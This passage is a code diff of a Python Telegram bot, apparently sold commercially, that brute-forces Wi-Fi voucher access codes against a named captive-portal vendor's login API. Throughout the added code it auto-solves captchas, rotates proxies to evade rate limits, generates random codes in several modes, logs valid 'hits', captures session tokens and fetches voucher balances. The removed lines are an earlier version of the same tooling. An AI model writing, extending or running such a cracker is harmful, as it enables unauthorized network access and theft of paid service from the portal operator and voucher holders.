-    filepath = os.path.join("/tmp", filename)
-    
-    try:
-        with open(filepath, "w", encoding="utf-8") as f:
-            f.write(content)
-    except Exception as e:
-        await update.effective_message.reply_text(f"❌ File error: {e}")
-        return
-    
-    try:
-        with open(filepath, "rb") as f:
-            await update.effective_message.reply_document(
-                document=f,
-                filename=filename,
-                caption=f"📦 **HIT LIST**\n🔥 Total: `{len(hits)}`",
-                parse_mode=ParseMode.MARKDOWN)
-    except Exception as e:
-        await update.effective_message.reply_text(f"❌ Send error: {e}")
-    
-    try:
-        os.remove(filepath)
-    except Exception:
-        pass
+# ---------------- CHECK SINGLE ACCESS CODE ----------------
+async def check_single_access_code(
+    session,
+    code,
+    current_session_id,
+    login_url,
+    captcha_base_url,
+    verify_url,
+    headers,
+    user_id,
+    current_proxy,
+    use_proxy,
+):
+    ud = get_user_data(user_id)
+    captcha_url = f"{captcha_base_url}?sessionId={current_session_id}"
+    retry_count = 0
+    while not ud["stop_event"].is_set():
+        auth_code = await solve_captcha_simple_async(session, captcha_url, headers)
+        if not auth_code or len(auth_code) < 2:
+            await asyncio.sleep(0.01)
+            continue
 
+        v_payload = {"sessionId": current_session_id, "authCode": auth_code}
+        try:
+            async with session.post(
+                verify_url, json=v_payload, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=30, connect=10)
+            ) as v_resp:
+                if v_resp.status != 200:
+                    continue
+                v_data = await v_resp.json()
+                if not v_data.get("success"):
+                    continue
 
-# ═══════════════════════════════════════════════════════════════════
-#  HIT CLEAR
-# ═══════════════════════════════════════════════════════════════════
-async def clear_user_hits(user_id: int) -> int:
-    ud = user_scanners.get(user_id)
-    if not ud:
-        return 0
-    count = len(ud.get("hit_details", []))
-    ud["hit_details"] = []
-    ud["hit_list"] = []
-    ud["hits"] = 0
-    save_user_state(user_id, ud)
-    return count
+                l_payload = {
+                    "accessCode": code,
+                    "sessionId": current_session_id,
+                    "apiVersion": 1,
+                    "authCode": auth_code,
+                }
+                async with session.post(
+                    login_url, json=l_payload, headers=headers, ssl=False, timeout=aiohttp.ClientTimeout(total=30, connect=10)
+                ) as l_resp:
+                    ud["stats"]["tried"] += 1
+                    l_text = (await l_resp.text()).lower()
 
+                    if "request limited" in l_text:
+                        retry_count += 1
+                        if retry_count < 5:
+                            continue
+                        else:
+                            return "limit"
 
-# ═══════════════════════════════════════════════════════════════════
-#  PROXY CLEAR
-# ═══════════════════════════════════════════════════════════════════
-async def clear_all_proxies() -> int:
+                    if '"success":true' in l_text:
+                        ud["stats"]["hits"] += 1
+                        if not any(item["code"] == code for item in ud["valid_codes"]):
+                            ud["valid_codes"].append(
+                                {"code": code, "balance_str": "...fetching..."}
+                            )
+
+                        ud["dash_update_event"].set()
+
+                        token_match = re.search(r'token=([^&\s"\'<>]+)', l_text)
+                        if token_match:
+                            active_token = token_match.group(1)
+                            asyncio.create_task(
+                                check_balance(
+                                    active_token, code, user_id, current_proxy, use_proxy
+                                )
+                            )
+                        return "hit"
+                    elif "expired" in l_text:
+                        ud["stats"]["expired"] += 1
+                        return "expired"
+                    elif (
+                        "the number of sta exceeds the limit" in l_text
+                        or "limit" in l_text
+                    ):
+                        ud["stats"]["limits"] += 1
+                        if code not in ud["limit_codes"]:
+                            ud["limit_codes"].append(code)
+                        ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
+                        return "limit"
+                    return "failed"
+        except Exception:
+            return "failed"
+    return "failed"
+
+# ---------------- WORKER ----------------
+async def worker(worker_id, login_url, captcha_base_url, verify_url, headers, user_id):
+    ud = get_user_data(user_id)
     pm = get_proxy_manager()
-    old_count = len([p for p in pm.proxies if p != DIRECT])
-    try:
-        with open(PROXY_FILE, "w") as f:
-            pass
-    except Exception:
-        pass
-    pm.proxies = [DIRECT] * DIRECT_SLOTS if pm.direct_enabled else []
-    pm.bad_proxies.clear()
-    pm.index = 0
-    return old_count
+    use_proxy = ud["use_proxy"]
 
-# ═══════════════════════════════════════════════════════════════════
-#  LIVE DASHBOARD
-# ═══════════════════════════════════════════════════════════════════
-async def live_dashboard_updater(context, user_id):
-    ud = user_scanners.get(user_id)
-    if not ud:
-        return
-    stop_event = ud["stop_event"]
-    dash_id = ud.get("dash_msg_id")
+    while not ud["stop_event"].is_set():
+        proxy = None
+        proxy_connector = None
+
+        if use_proxy:
+            proxy = await pm.get_next()
+            if proxy is None:
+                await asyncio.sleep(1)
+                continue
+            proxy_connector = create_connector_for_proxy(proxy)
+
+        try:
+            async with aiohttp.ClientSession(
+                connector=proxy_connector, connector_owner=True, timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC, connect=15)
+            ) as session:
+                current_session_id = None
+                codes_checked_this_sid = 0
+                codes_checked_this_session = 0
+                sid_failures = 0
+
+                while (
+                    not ud["stop_event"].is_set()
+                    and codes_checked_this_session < MAX_CODES_PER_SESSION
+                ):
+                    if (
+                        current_session_id is None
+                        or codes_checked_this_sid >= MAX_CODES_PER_SID
+                    ):
+                        sid, mac = await get_sid_from_gateway(
+                            session, ud["portal_url"], user_id
+                        )
+                        if sid is None:
+                            sid_failures += 1
+                            if sid_failures >= 3:
+                                if use_proxy and proxy:
+                                    await pm.mark_bad(proxy)
+                                break
+                            await asyncio.sleep(1)
+                            continue
+                        current_session_id = sid
+                        codes_checked_this_sid = 0
+                        sid_failures = 0
+
+                    while not ud["stop_event"].is_set():
+                        if ud["mode"] == "custom" and ud["start_digit"] is not None:
+                            body_chars = random.choices(
+                                ud["char_set"], k=ud["code_len"] - 1
+                            )
+                            random.shuffle(body_chars)
+                            code = ud["start_digit"] + "".join(body_chars)
+                        else:
+                            code = "".join(random.choices(ud["char_set"], k=ud["code_len"]))
+                        if code not in ud["tried_codes"]:
+                            ud["tried_codes"].add(code)
+                            break
+                        await asyncio.sleep(0.001)
+
+                    if ud["stop_event"].is_set():
+                        break
+
+                    ud["CURRENT_CODE"] = code
+                    result = await check_single_access_code(
+                        session,
+                        code,
+                        current_session_id,
+                        login_url,
+                        captcha_base_url,
+                        verify_url,
+                        headers,
+                        user_id,
+                        proxy,
+                        use_proxy,
+                    )
+                    codes_checked_this_sid += 1
+                    codes_checked_this_session += 1
+        except Exception:
+            if use_proxy and proxy:
+                await pm.mark_bad(proxy)
+            await asyncio.sleep(0.5)
+
+# ---------------- LIVE DASHBOARD ----------------
+async def live_dashboard_updater(context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    ud = get_user_data(user_id)
     pm = get_proxy_manager()
-    try:
-        while not stop_event.is_set():
-            await asyncio.sleep(5)
-            if stop_event.is_set():
-                break
-            elapsed = max(time.time() - ud["start_time"], 1)
-            speed = int(ud["tried"] / elapsed * 60)
-            real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
-            if real_total == 0:
-                proxy_line = f"DIRECT ({DIRECT_SLOTS})" if direct_on else "EMPTY ❌"
-            elif real_alive == 0:
-                proxy_line = "fallback → DIRECT" if direct_on else f"ALL DEAD ❌ ({real_total})"
-            else:
-                extra = f"  💀 {dead_cnt}" if dead_cnt > 0 else ""
-                proxy_line = f"{real_alive}/{real_total}{extra}"
+    while not ud["stop_event"].is_set():
+        if ud["dash_msg_id"] is None:
+            await asyncio.sleep(0.5)
+            continue
+        try:
+            stats = ud["stats"]
+            elapsed = time.time() - stats["start_time"]
+            speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
 
-            hit_lines = []
-            for h in ud.get("hit_details", [])[-10:]:
-                hit_lines.append(f"`{h['code']}` - {h.get('plan', '...')} | {h.get('time_str', '...')}")
-            hits_block = "\n".join(hit_lines) if hit_lines else "— no hits yet —"
+            proxy_total, proxy_active = pm.stats()
+            mode_status = "🔀 Proxy Mode" if ud["use_proxy"] else "🌐 Direct Mode (No Proxy)"
+
+            hit_list = []
+            for item in ud["valid_codes"]:
+                c = item["code"]
+                balance = item.get("balance_str", "...fetching...")
+                hit_list.append(f"{c} {balance}")
+            hit_str = "\n".join(hit_list) if hit_list else "None yet"
+
             text = (
-                "⚡ **ULTIMATE SCANNER** ⚡\n"
-                "━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🏹 Tried: `{ud['tried']:,}`\n"
-                f"🔥 Hits: `{ud['hits']}`\n"
-                f"⚠️ Limits: `{ud['limits']}`\n"
-                f"❌ Net: `{ud['net']}`\n"
-                f"⚡ Speed: `{speed:,} c/m`\n"
-                f"🔀 Proxies: `{proxy_line}`\n"
-                f"🔀 Direct: `{'ON' if direct_on else 'OFF'}`\n"
-                f"🎯 Current: `{ud.get('current_code', '—')}`\n"
-                "━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"🎁 **HITS**\n{hits_block}\n"
-                "━━━━━━━━━━━━━━━━━━━━━━"
+                f"⚡ Scanner Running ⚡\n"
+                f"Mode: {mode_status}\n"
+                f"Thank for using By Telegram @yarzar373\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"🎲 Tried: {stats['tried']:,}\n"
+                f"🎯 Current Code: {ud['CURRENT_CODE']}\n"
+                f"💡 Hits: {stats['hits']}\n"
+                f"⚔️ Expired: {stats['expired']}\n"
+                f"⛔ Limits: {stats['limits']}\n"
+                f"🪐 Speed: {speed_cpm:.1f} c/m\n"
+                f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
+                f"💡 **Hit Codes**:\n{hit_str}\n"
+                f"━━━━━━━━━━━━━━━━━━\n"
             )
-            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")]])
-            try:
-                await context.bot.edit_message_text(
-                    chat_id=user_id, message_id=dash_id, text=text,
-                    parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
-            except Exception:
-                pass
-    except asyncio.CancelledError:
-        raise
+            if ud["recent_logs"]:
+                last_log = ud["recent_logs"][-1]
+                text += f"💡 Last: {last_log}\n"
 
+            keyboard = InlineKeyboardMarkup(
+                [[InlineKeyboardButton(text="🛑 Stop", callback_data="stop_scan")]]
+            )
 
-async def final_dashboard(context, user_id, ud):
-    pm = get_proxy_manager()
-    total, active = pm.stats()
-    elapsed = max(time.time() - ud["start_time"], 1)
-    speed = int(ud["tried"] / elapsed * 60)
-    hit_lines = []
-    for h in ud.get("hit_details", []):
-        hit_lines.append(f"`{h['code']}` - {h.get('plan', '...')} | {h.get('time_str', '...')}")
-    hits_block = "\n".join(hit_lines) if hit_lines else "— no hits —"
-    text = (
-        "💀 **SCAN ENDED** 💀\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🏹 Tried: `{ud['tried']:,}`\n"
-        f"🔥 Hits: `{ud['hits']}`\n"
-        f"⚠️ Limits: `{ud['limits']}`\n"
-        f"❌ Net: `{ud['net']}`\n"
-        f"⚡ Speed: `{speed:,} c/m`\n"
-        "━━━━━━━━━━━━━━━━━━━━━━\n"
-        f"🎁 **ALL HITS**\n{hits_block}\n"
-        "━━━━━━━━━━━━━━━━━━━━━━"
-    )
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]])
-    try:
-        await context.bot.edit_message_text(
-            chat_id=user_id, message_id=ud["dash_msg_id"], text=text,
-            parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
-    except Exception:
-        pass
+            await context.bot.edit_message_text(
+                chat_id=user_id,
+                message_id=ud["dash_msg_id"],
+                text=text,
+                reply_markup=keyboard,
+            )
+        except Exception:
+            pass
 
+        try:
+            await asyncio.wait_for(ud["dash_update_event"].wait(), timeout=10.0)
+            ud["dash_update_event"].clear()
+        except asyncio.TimeoutError:
+            pass
 
-# ═══════════════════════════════════════════════════════════════════
-#  START SCANNER
-# ═══════════════════════════════════════════════════════════════════
-async def run_user_scanner(context, user_id):
-    if user_scanners.get(user_id, {}).get("running"):
-        return
+# ---------------- START SCANNER ----------------
+async def run_user_scanner(context: ContextTypes.DEFAULT_TYPE, user_id: int):
+    ud = get_user_data(user_id)
 
     pm = get_proxy_manager()
-    portal_url = get_portal_url(user_id) or PORTAL_INDEX
-    saved = load_user_state(user_id)
-    resume = False
-    if saved and saved.get("portal_url") == portal_url and saved.get("tried", 0) > 0:
-        resume = True
+    proxy_total, proxy_active = pm.stats()
+    if ud["use_proxy"] and proxy_total == 0:
+        await context.bot.send_message(
+            chat_id=user_id,
+            text=f"⚠️ **No proxies loaded! Switch to Direct Mode or add proxies.**\n\n",
+            parse_mode=ParseMode.MARKDOWN,
+        )
 
-    if resume and saved:
-        tried = load_tried_codes(user_id)
-        hit_details = deserialize_hits(saved.get("hit_details", []))
-        mode = saved.get("mode", "num6")
-        tried_count = saved.get("tried", 0)
-        hits = saved.get("hits", 0)
-        limits = saved.get("limits", 0)
-        net = saved.get("net", 0)
-        started_at = saved.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
-    else:
-        tried = set()
-        hit_details = []
-        mode = context.user_data.get("selected_mode", "num6")
-        tried_count = 0
-        hits = 0
-        limits = 0
-        net = 0
-        started_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
-    ud = {
-        "running": True, "context": context, "user_id": user_id,
-        "portal_url": portal_url, "mode": mode,
-        "stop_event": asyncio.Event(),
-        "tried": tried_count, "hits": hits, "limits": limits, "net": net, "failed": 0,
-        "hit_list": [h["code"] for h in hit_details],
-        "tried_codes": tried, "recent_logs": [],
-        "last_hit": hit_details[-1]["code"] if hit_details else None,
-        "current_code": "—", "start_time": time.time(),
-        "hit_details": hit_details, "started_at_str": started_at,
-        "counter": 0, "tasks": [], "dash_msg_id": None,
+    login_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
+    captcha_base_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/image"
+    verify_url = "https://portal-as.ruijienetworks.com/api/auth/captcha/verify"
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
+        "Content-Type": "application/json",
+        "Origin": "https://portal-as.ruijienetworks.com",
+        "Referer": "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html",
     }
-    user_scanners[user_id] = ud
 
-    real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
+    ud["dash_update_event"].clear()
+    tasks = [
+        asyncio.create_task(live_dashboard_updater(context, user_id)),
+    ]
+    worker_count = NUM_WORKERS
+    for i in range(worker_count):
+        tasks.append(
+            asyncio.create_task(
+                worker(i, login_url, captcha_base_url, verify_url, headers, user_id)
+            )
+        )
 
-    if real_total == 0 and direct_on:
-        await context.bot.send_message(chat_id=user_id,
-            text="⚠️ **No proxies loaded!** Running in **Direct Mode**.",
-            parse_mode=ParseMode.MARKDOWN)
-    elif real_total == 0 and not direct_on:
-        await context.bot.send_message(chat_id=user_id,
-            text="❌ **Cannot start!** No proxies AND Direct OFF.",
-            parse_mode=ParseMode.MARKDOWN)
-        ud["running"] = False
-        return
-    elif real_alive == 0 and direct_on and real_total > 0:
-        await context.bot.send_message(chat_id=user_id,
-            text=f"⚠️ All {real_total} proxies dead. Falling back to **Direct**.",
-            parse_mode=ParseMode.MARKDOWN)
-    elif real_alive == 0 and not direct_on and real_total > 0:
-        await context.bot.send_message(chat_id=user_id,
-            text=f"❌ All {real_total} proxies dead AND Direct OFF.",
-            parse_mode=ParseMode.MARKDOWN)
-        ud["running"] = False
-        return
-
-    dash = await context.bot.send_message(chat_id=user_id,
-        text="🔮 Starting scanner...", parse_mode=ParseMode.MARKDOWN)
-    ud["dash_msg_id"] = dash.message_id
-    save_user_state(user_id, ud)
-
-    tasks = [asyncio.create_task(worker(i, user_id)) for i in range(NUM_WORKERS)]
-    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
-    ud["tasks"] = tasks
-
+    ud["task"] = asyncio.current_task()
     try:
-        await ud["stop_event"].wait()
+        await asyncio.gather(*tasks)
     except asyncio.CancelledError:
         pass
     finally:
-        for t in tasks:
-            if not t.done():
-                t.cancel()
-        await asyncio.gather(*tasks, return_exceptions=True)
-        save_user_state(user_id, ud)
-        try:
-            await final_dashboard(context, user_id, ud)
-        except Exception:
-            pass
-        ud["running"] = False
+        stats = ud["stats"]
+        elapsed = time.time() - stats["start_time"]
+        speed_cpm = (stats["tried"] / elapsed) * 60 if elapsed > 0 else 0
 
-# ═══════════════════════════════════════════════════════════════════
-#  UI MARKUPS
-# ═══════════════════════════════════════════════════════════════════
-def get_main_menu_markup():
+        proxy_total, proxy_active = pm.stats()
+
+        hit_list = []
+        for item in ud["valid_codes"]:
+            c = item["code"]
+            balance = item.get("balance_str", "...fetching...")
+            hit_list.append(f"{c} {balance}")
+        hit_str = "\n".join(hit_list) if hit_list else "None"
+
+        final_text = (
+            f"🛑 Scanner Stopped/Finished\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"🎲 Total Tried: {stats['tried']:,}\n"
+            f"💡 Hits: {stats['hits']}\n"
+            f"⚡ Final Speed: {speed_cpm:.1f} c/m\n"
+            f"🔀 Proxies: {proxy_active}/{proxy_total}\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"💡 **All Hit Codes**:\n{hit_str}\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+        )
+
+        if ud["dash_msg_id"]:
+            try:
+                await context.bot.edit_message_text(
+                    chat_id=user_id, message_id=ud["dash_msg_id"], text=final_text
+                )
+            except Exception:
+                await context.bot.send_message(chat_id=user_id, text=final_text)
+        else:
+            await context.bot.send_message(chat_id=user_id, text=final_text)
+
+        ud["stop_event"].clear()
+        ud["dash_msg_id"] = None
+        ud["task"] = None  
+
+# ---------------- KEYBOARDS & HANDLERS ----------------
+def get_main_menu_markup(use_proxy: bool):
+    proxy_btn_text = "🌐 Mode: Proxy (Click to Switch Direct)" if use_proxy else "🌐 Mode: Direct (Click to Switch Proxy)"
+    return InlineKeyboardMarkup(
+        [
+            [
+                InlineKeyboardButton(
+                    text="🛢 Update Portal", callback_data="btn_update_portal"
+                )
+            ],
+            [InlineKeyboardButton(text="⚙️ Mode", callback_data="btn_mode_menu")],
+            [
+                InlineKeyboardButton(
+                    text=proxy_btn_text, callback_data="toggle_proxy_mode"
+                )
+            ],
+            [
+                InlineKeyboardButton(
+                    text="➕ Add / Upload Proxies", callback_data="btn_add_proxies"
+                )
+            ],
+            [
+                InlineKeyboardButton(
+                    text="🚀 Start Scanner", callback_data="btn_start_scanner"
+                )
+            ],
+        ]
+    )
+
+def admin_only(func):
+    async def wrapper(
+        update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs
+    ):
+        user_id = update.effective_user.id
+        if user_id not in ADMIN_IDS:
+            if update.effective_message:
+                await update.effective_message.reply_text(
+                    "⛔ ဤ Bot ကို အသုံးပြုခွင့်မရှိပါ။ အသုံးပြုချင်ပါက telegram @yarzar373 ဆီမှာ ဝယ်ယူပါ👊👊"
+                )
+            return
+        return await func(update, context, *args, **kwargs)
+
+    return wrapper
+
+@admin_only
+async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    ud = get_user_data(user_id)
+    ud["state"] = None
+
     pm = get_proxy_manager()
-    direct_label = f"🔀 DIRECT: {'ON' if pm.direct_enabled else 'OFF'}"
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔮 PORTAL", callback_data="btn_portal"),
-         InlineKeyboardButton("📜 MODES", callback_data="btn_modes")],
-        [InlineKeyboardButton("⚡ START SCAN", callback_data="btn_start"),
-         InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")],
-        [InlineKeyboardButton("🕷️ ADD PROXIES", callback_data="btn_add_proxies"),
-         InlineKeyboardButton("🧹 CLEAR PROXIES", callback_data="btn_clear_proxies")],
-        [InlineKeyboardButton("📦 MY HITS", callback_data="btn_hits"),
-         InlineKeyboardButton("📥 DOWNLOAD HITS", callback_data="btn_download_hits")],
-        [InlineKeyboardButton("🗑 CLEAR HITS", callback_data="btn_clear_hits"),
-         InlineKeyboardButton(direct_label, callback_data="btn_toggle_direct")],
-        [InlineKeyboardButton("👁️ STATUS", callback_data="btn_status")],
-    ])
+    proxy_total, proxy_active = pm.stats()
 
+    msg = await update.message.reply_text(
+        f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+        f"⚙️ Current Mode: `{ud['mode']}`\n"
+        f"🌐 Connection: `{'Proxy Mode' if ud['use_proxy'] else 'Direct Mode'}`\n"
+        f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
+        reply_markup=get_main_menu_markup(ud["use_proxy"]),
+        parse_mode=ParseMode.MARKDOWN,
+    )
+    ud["menu_msg_id"] = msg.message_id
 
-def get_mode_menu_markup():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🩸 06 NUM", callback_data="set_mode_num6"),
-         InlineKeyboardButton("🩸 07 NUM", callback_data="set_mode_num7")],
-        [InlineKeyboardButton("🩸 08 NUM", callback_data="set_mode_num8"),
-         InlineKeyboardButton("🩸 09 NUM", callback_data="set_mode_num9")],
-        [InlineKeyboardButton("💀 06 MIX", callback_data="set_mode_mix6"),
-         InlineKeyboardButton("💀 07 MIX", callback_data="set_mode_mix7")],
-        [InlineKeyboardButton("💀 08 MIX", callback_data="set_mode_mix8"),
-         InlineKeyboardButton("📜 06 ABC", callback_data="set_mode_abc6")],
-        [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
-    ])
+@admin_only
+async def add_proxies_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    ud = get_user_data(user_id)
+    ud["state"] = "waiting_for_proxy_text"
+    ud["menu_msg_id"] = update.effective_message.message_id
+    await update.message.reply_text(
+        "📥 **Proxy များကို `proxies.txt` ဖိုင်အနေဖြင့် (သို့မဟုတ်) စာသားပုံစံဖြင့် ယခုပို့ပါ**\nDead proxies များကို အလိုအလျောက် စစ်ဆေးဖယ်ရှားပေးပါမည်။", parse_mode=ParseMode.MARKDOWN
+    )
 
-
-# ═══════════════════════════════════════════════════════════════════
-#  CALLBACK HANDLER
-# ═══════════════════════════════════════════════════════════════════
+@admin_only
 async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = update.effective_user.id
+    ud = get_user_data(user_id)
     data = query.data
-    ud = user_scanners.get(user_id, {})
-    pm = get_proxy_manager()
-    total, active = pm.stats()
-    mode = ud.get("mode", context.user_data.get("selected_mode", "num6"))
 
-    if data == "btn_toggle_direct":
-        new_state = not pm.direct_enabled
-        await pm.set_direct_enabled(new_state)
-        state = "ON" if new_state else "OFF"
-        warn = ("✅ Scan will work even without proxies." if new_state
-                else "⚠️ Scan requires live proxies when OFF.")
-        real_total, real_alive = pm.stats()
-        portal = get_portal_url(user_id)
-        text = (
-            f"🔀 **Direct Mode: {state}**\n{warn}\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📜 Mode: `{MODES.get(mode, mode)}`\n"
-            f"🔀 Proxies: `{real_alive}/{real_total}`\n"
-            f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
-        )
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
-                                      reply_markup=get_main_menu_markup())
-        return
-
-    if data == "btn_download_hits":
-        await send_hits_file(update, context, user_id)
-        return
-
-    if data == "btn_clear_hits":
-        count = await clear_user_hits(user_id)
-        await query.edit_message_text(
-            f"🗑 **HITS CLEARED**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"Removed: `{count}` hits\n"
-            f"✅ All hits deleted.",
+    if data == "toggle_proxy_mode":
+        ud["use_proxy"] = not ud["use_proxy"]
+        pm = get_proxy_manager()
+        proxy_total, proxy_active = pm.stats()
+        await query.message.edit_text(
+            f"⚡ **Starlink Scanner Control Panel** ⚡\n\n"
+            f"⚙️ Current Mode: `{ud['mode']}`\n"
+            f"🌐 Connection: `{'Proxy Mode' if ud['use_proxy'] else 'Direct Mode'}`\n"
+            f"🔀 Proxies: `{proxy_active}/{proxy_total}`",
+            reply_markup=get_main_menu_markup(ud["use_proxy"]),
             parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]
-            ]))
-        return
-
-    if data == "btn_clear_proxies":
-        old_count = await clear_all_proxies()
-        await query.edit_message_text(
-            f"🧹 **PROXIES CLEARED**\n"
-            f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"Removed: `{old_count}` proxies\n"
-            f"✅ Proxy file is now empty.",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=InlineKeyboardMarkup([
-                [InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]
-            ]))
-        return
-
-    if data == "btn_back_main":
-        context.user_data.pop("waiting_for_proxy", None)
-        context.user_data.pop("waiting_for_portal", None)
-        portal = get_portal_url(user_id)
-        real_total, real_alive = pm.stats()
-        text = (
-            "⚡ **ULTIMATE SCANNER** ⚡\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"📜 Mode: `{MODES.get(mode, mode)}`\n"
-            f"🔀 Proxies: `{real_alive}/{real_total}`\n"
-            f"🔀 Direct: `{'ON' if pm.direct_enabled else 'OFF'}`\n"
-            f"🔮 Portal: {'✅ Ready' if portal else '❌ Not Set'}\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
         )
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
-                                      reply_markup=get_main_menu_markup())
-        return
 
-    if data == "btn_modes":
-        await query.edit_message_text("📜 **SELECT MODE**", parse_mode=ParseMode.MARKDOWN,
-                                      reply_markup=get_mode_menu_markup())
-        return
+    elif data == "btn_update_portal":
+        ud["state"] = "waiting_for_portal_url"
+        ud["menu_msg_id"] = query.message.message_id
+        await query.message.edit_text("🛢 **Portal URL ကို ပို့ပေးပါ။**")
 
-    if data.startswith("set_mode_"):
-        new_mode = data.replace("set_mode_", "")
-        context.user_data["selected_mode"] = new_mode
-        if user_id in user_scanners:
-            user_scanners[user_id]["mode"] = new_mode
-        await query.edit_message_text(
-            f"✅ Mode set to `{MODES.get(new_mode, new_mode)}`",
-            parse_mode=ParseMode.MARKDOWN,
-            reply_markup=get_main_menu_markup())
-        return
-
-    if data == "btn_portal":
-        context.user_data["waiting_for_portal"] = True
-        await query.edit_message_text(
-            "🔮 **Send Portal URL**\n\n"
-            "Format: `https://portal-as.ruijienetworks.com/...?sessionId=...`",
-            parse_mode=ParseMode.MARKDOWN)
-        return
-
-    if data == "btn_add_proxies":
-        context.user_data["waiting_for_proxy"] = True
-        await query.edit_message_text(
-            "🕷️ **Send Proxy List**\n\n"
-            "Format: `ip:port` or `socks5://user:pass@ip:port`\n"
-            "One per line.",
-            parse_mode=ParseMode.MARKDOWN)
-        return
-
-    if data == "btn_status":
-        real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
-        text = (
-            "👁️ **STATUS**\n"
-            "━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"🔀 Proxies: `{real_alive}/{real_total}`\n"
-            f"💀 Dead: `{dead_cnt}`\n"
-            f"🔀 Direct: `{'ON' if direct_on else 'OFF'}`\n"
-            f"📜 Mode: `{MODES.get(mode, mode)}`\n"
-            f"⚡ Workers: `{NUM_WORKERS}`\n"
-            f"📦 Running: `{'Yes' if ud.get('running') else 'No'}`\n"
-            "━━━━━━━━━━━━━━━━━━━━━━"
+    elif data == "btn_mode_menu":
+        keyboard = InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton(text="Number 6", callback_data="set_mode_num6"),
+                    InlineKeyboardButton(text="Number 7", callback_data="set_mode_num7"),
+                    InlineKeyboardButton(text="Number 8", callback_data="set_mode_num8"),
+                ],
+                [InlineKeyboardButton(text="Number 9", callback_data="set_mode_num9")],
+                [
+                    InlineKeyboardButton(text="Abc 6", callback_data="set_mode_abc6"),
+                    InlineKeyboardButton(text="Mix 6", callback_data="set_mode_mix6"),
+                    InlineKeyboardButton(text="Mix 7", callback_data="set_mode_mix7"),
+                    InlineKeyboardButton(text="Mix 8", callback_data="set_mode_mix8"),
+                    InlineKeyboardButton(text="Mix 9", callback_data="set_mode_mix9"),
+                ],
+                [InlineKeyboardButton(text="Custom Start", callback_data="set_mode_custom")],
+                [InlineKeyboardButton(text="⬅️ Back", callback_data="btn_back_main")],
+            ]
         )
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
-                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
-        return
+        await query.message.edit_text("⚙️ **Choose Scanner Mode**", reply_markup=keyboard)
 
-    if data == "btn_hits":
-        hits = ud.get("hit_details", [])
-        if not hits:
-            await query.edit_message_text(
-                "📦 **No hits yet.**", parse_mode=ParseMode.MARKDOWN,
-                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]]))
+    elif data.startswith("set_mode_"):
+        selected_mode = data.split("set_mode_")[1]
+        if selected_mode == "num6":
+            ud["mode"] = "num6"
+            ud["char_set"] = "012345678"
+            ud["code_len"] = 6
+            ud["start_digit"] = None
+        elif selected_mode == "num7":
+            ud["mode"] = "num7"
+            ud["char_set"] = "012345678"
+            ud["code_len"] = 7
+            ud["start_digit"] = None
+        elif selected_mode == "num8":
+            ud["mode"] = "num8"
+            ud["char_set"] = "012345678"
+            ud["code_len"] = 8
+            ud["start_digit"] = None
+        elif selected_mode == "num9":
+            ud["mode"] = "num9"
+            ud["char_set"] = "012345678"
+            ud["code_len"] = 9
+            ud["start_digit"] = None
